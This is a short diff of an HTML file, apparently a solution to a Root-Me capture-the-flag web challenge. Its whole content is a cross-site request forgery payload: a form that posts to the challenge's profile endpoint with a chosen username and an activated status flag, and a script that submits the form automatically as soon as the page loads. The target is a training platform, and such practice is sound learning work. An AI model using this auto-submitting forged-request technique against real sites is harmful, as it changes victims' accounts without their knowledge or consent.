@@ -1,19 +1,18 @@
-<!DOCTYPE html>
-<html lang="fr">
-  <body>
-    <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile"
-          method="POST"
-          enctype="multipart/form-data">
-      <input type="text" name="username" value="tonioshast">
-      
-      <input type="checkbox" name="status" checked>
-      
-      
-    </form>
+<body>
+  <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile"
+        method="POST"
+        enctype="multipart/form-data">
+    <input type="text" name="username" value="tonioshast">
+    <input type="checkbox" name="status">
+  </form>
 
-    <script>
-      // Soumission immédiate du formulaire
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
+  <script>
+    const checkbox = document.querySelector('input[name="status"]');
+    if (!checkbox.disabled) {
+      checkbox.checked = true;
+    }
+
+    // Soumission immédiate : le navigateur génèrera lui-même les WebKitFormBoundary
+    document.forms[0].submit();
+  </script>
+</body>
